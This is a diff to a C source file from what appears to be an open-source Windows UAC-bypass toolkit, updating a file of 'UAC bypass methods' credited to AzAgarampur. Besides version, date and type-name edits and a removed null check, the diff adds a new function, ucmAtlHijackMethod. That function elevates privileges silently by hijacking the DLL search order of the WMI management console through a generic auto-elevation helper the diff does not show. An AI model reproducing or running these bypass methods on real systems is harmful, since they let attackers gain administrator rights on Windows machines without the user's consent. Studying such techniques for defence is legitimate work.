@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2022
+*  (C) COPYRIGHT AUTHORS, 2020 - 2024
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.63
+*  VERSION:     3.65
 *
-*  DATE:        16 Jul 2022
+*  DATE:        22 Sep 2023
 *
 *  UAC bypass methods from AzAgarampur.
 *
@@ -19,6 +19,7 @@
 *  https://github.com/AzAgarampur/byeintegrity-lite
 *  https://github.com/AzAgarampur/byeintegrity7-uac
 *  https://github.com/AzAgarampur/byeintegrity8-uac
+*  https://github.com/AzAgarampur/byeintegrity9-uac
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -407,8 +408,6 @@ NTSTATUS ucmIeAddOnInstallMethod(
         _strcpy(szDummyTarget, g_ctx->szSystemDirectory);
         _strcat(szDummyTarget, CONSENT_EXE);
 
-        r = E_FAIL;
-
         //
         // Verify image embedded signature.
         // Uppon success copy given file to the temporary directory and return full filepath.
@@ -429,9 +428,7 @@ NTSTATUS ucmIeAddOnInstallMethod(
                 &dummy,
                 &dummyPtr);
 
-            if (dummyPtr)
-                CoTaskMemFree(dummyPtr);
-
+            CoTaskMemFree(dummyPtr);
             SysFreeString(fileToVerify);
         }
 
@@ -1496,7 +1493,7 @@ BOOL ucmxExamineTaskhost(
 *
 */
 BOOL CALLBACK ucmxEnumTaskhost(
-    _In_ PSYSTEM_PROCESSES_INFORMATION ProcessEntry,
+    _In_ PSYSTEM_PROCESS_INFORMATION ProcessEntry,
     _In_ PVOID UserContext
 )
 {
@@ -2311,4 +2308,27 @@ NTSTATUS ucmNICPoisonMethod2(
         supSetGlobalCompletionEvent();
 
     return MethodResult;
+}
+
+/*
+* ucmAtlHijackMethod
+*
+* Purpose:
+*
+* Bypass UAC by abusing search order of WMI management console dependency dll.
+*
+*/
+NTSTATUS ucmAtlHijackMethod(
+    _In_opt_ LPCWSTR lpTargetApp,
+    _In_ LPCWSTR lpTargetDll,
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    return ucmGenericAutoelevationEx(lpTargetApp,
+        lpTargetDll,
+        WMIMGMT_MSC,
+        WBEM_DIR,
+        ProxyDll,
+        ProxyDllSize);
 }
